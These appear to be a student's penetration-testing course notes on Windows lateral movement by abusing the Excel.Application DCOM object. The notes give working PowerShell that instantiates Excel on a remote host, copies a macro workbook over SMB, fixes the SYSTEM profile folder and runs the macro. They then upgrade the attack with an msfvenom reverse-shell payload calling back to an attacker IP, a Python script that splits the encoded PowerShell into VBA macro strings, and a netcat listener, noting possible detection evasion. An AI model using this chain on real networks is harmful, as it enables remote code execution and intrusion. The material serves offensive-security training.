We will utilize the **Distributed Component Object Model (DCOM)**

***
There are two other well-known lateral movement techniques worth mentioning:
abusing Windows Management Instrumentation680 and a technique known as
PowerShell Remoting.681 While we will not go into details of these methods here,
they have their own advantages and drawbacks as well as multiple
implementations in both PowerShell682 and Python.683
***

The Microsoft Component Object Model (COM) is a system for creating software components that interact with each other. COM was created for either same-process or cross-process interatction and was extended to DCOM for interaction between multiple computers over a network. 

These are very old technologies dating back to first editions of Windows. Interaction with DCOM is over RPC on TCP 135, and local admin access is required to call DCOM Service Control Manager with is bascially an API.

DCOM objects related to MS Office allow lat mvmt, both through Outlook and Powerpoint. Since this requires MS Office to be on the target, this works best against workstations. 

we will leverage the **Excel.Application** DCOM Object.

We must first discover the available methods or sub-objects for thei DCOM object using PS. 

For this example, the OS is Win10 and we are jeff_admin user, a local admin on the remote machine. 

We will create an instance of the object using PS and the **CreateInstance** method of the **System.Activator** class. 

As an argument to CreateInstance, we must provide it's type by using the **GetTypeFromProgID** method, specifignt he program identifier (In this case the Excel.Application) along with the IP of the remote workstation. 

With the object instantiated, we can discover it's available methods and objects using the **Get-Member** cmdlet.

Code to create DCOM object and enumerate methods:
```
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application",
"192.168.1.110"))

$com | Get-Member
```

output:
```
TypeName: System.__ComObject#{000208d5-0000-0000-c000-000000000046}
Name MemberType Definition
---- ---------- ----------
ActivateMicrosoftApp Method void ActivateMicrosoftApp (XlMSApplication)
AddChartAutoFormat Method void AddChartAutoFormat (Variant, string, Varia
...
ResetTipWizard Method void ResetTipWizard ()
Run Method Variant Run (Variant...
Save Method void Save (Variant)
...
Workbooks Property Workbooks Workbooks () {get}
```

output produces many methods and objects, but we will focus on the **Run** method, which allows exeuction of remote VBA macros.

We will first create an excel doc with a PoC macro by selection the *VIEW* ribbon and clicking *Macros* in Excel. 

we will use a VBA macro that launches notepad.exe:
```
Sub mymacro()
	Shell ("notepad.exe")
End Sub
```

Name macro "mymacro" and save excel file in legacy format **.xls**

To execute, copy excel doc to remote computer. Since we must be local admin to use DCOM, we should also have access to remote filesystem via SMB. 

We can use the **Copy** method of the .NET **System.IO.File** class to copy file. To invoke, we speicfy source file, dest file and a flag to indicate overwrite.

Copying excel file to remote computer:
```
$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"

$RemotePath = "\\192.168.1.110\c$\myexcel.xls"

[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
```

Before we can execute the Run method on teh macro, we must first specift he excel doc it's contained in. This is done with the **Open** method of the **workbooks** object, which is also available through DCOM as shown in our enumeration.

The Workbooks object is created from the $com COM handle we created earlier. 

Opening the excel doc on the DC:
`$Workbook = $com.Workbooks.Open("C:\myexcel.xls")`

Looks like we ahve an error. 

Why?
When **Excel.Application** is instantiated through DCOM, it's done with the SYSTEM account. This account does not have a profile, which is used as part of the opening process. To fix this, we simply create a desktop folder at **C:\Windows\SysWOW64\config\systemprofile**, which satisfies this profile requirement.

Createing the SYSTEM Profile Folder:
```
$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"

$temp = [system.io.directory]::createDirectory($Path)
```

Now everything should work. We should see Notepad as a background process executing in a high integrity context on the remote machine.

PoC Code to execute Excel macro remotely:
```
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application",
"192.168.1.110"))
$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
$RemotePath = "\\192.168.1.110\c$\myexcel.xls"
[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"
$temp = [system.io.directory]::createDirectory($Path)
$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
$com.Run("mymacro")
```

### Upgrading Attack

Notepad is interesting, but we need to doe something useful like launch a reverse shell. 

Use MSFVenom to create a payload for an HTA attack, since it contains the Base64 encoded payload to be used iwth powershell:
`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f
hta-psh -o evil.hta`

notice we use th IP of the win10 client's second network interface so that the DC can callback to our NC listener. 

Next we extract the line starting with "powershell.exe -nop" followed by the Base64 encoded payload and use the simple Python scrip to split the command into smaller chunks, bypassing the size limit on literal strings in Excel macros. 

Splitting the payload:
```
str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQ....."
n = 50
for i in range(0, len(str), n):
print "Str = Str + " + '"' + str[i:i+n] + '"'
```

Now we update our excel macro to execute PS instead of notepad and repeate actions to upload and execute on the DC:
```
Sub MyMacro()
	Dim Str As String
	Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
	Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
	...
	Str = Str + 				"EQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHM"
	Str = Str + "AXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA="
	Shell (Str)
End Sub
```

Before executing, start a NC listener on the Win10 client to accept reverse command shell from the DC. 
`nc.exe -lvnp 4444`

This attack requires access to both TCP 135 for DCOM and TCP 445 for SMB. 

This is a relatively new attack vector for lat mvmt and may avoid some detection systems. 